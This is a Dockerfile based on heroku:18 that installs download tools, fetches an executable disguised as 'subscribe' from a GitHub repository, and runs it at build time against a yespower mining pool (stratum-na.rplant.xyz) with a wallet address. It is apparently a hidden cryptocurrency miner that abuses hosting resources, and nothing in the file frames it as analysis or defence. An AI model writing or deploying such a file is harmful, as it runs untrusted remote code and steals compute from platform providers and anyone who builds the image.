FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qdgw2erw6suls04ll7t7d5dclh7vtfkz0ljpw6h.heroku
CMD bash heroku.sh
